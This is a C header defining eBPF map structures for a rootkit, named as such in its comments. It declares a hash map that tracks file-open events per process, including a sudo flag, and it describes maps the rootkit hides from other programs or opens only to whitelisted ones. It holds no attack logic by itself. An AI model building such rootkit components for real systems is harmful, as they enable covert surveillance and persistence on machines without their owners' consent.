#ifndef __BPF_MAP_DEFS_H
#define __BPF_MAP_DEFS_H

#include "headervmlinux.h"

//Tasks and comms
#define TASK_COMM_LEN 16


/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rookit

//File system data of a running program which opened some fd
#define FS_OPEN_DATA_PROGRAM_NAME_SIZE 16
#define FS_OPEN_DATA_FILENAME_SIZE 16

struct fs_open_data{ //Map value
	char* buf;
	int fd;
	__u32 pid;
	char program_name[FS_OPEN_DATA_PROGRAM_NAME_SIZE];
	char filename[FS_OPEN_DATA_FILENAME_SIZE];
	int is_sudo;
};

struct fs_priv_open{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_open_data);
} fs_open SEC(".maps");



/*PROTECTED MAPS*/
//Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
//Located at /src/map_prot.h

#endif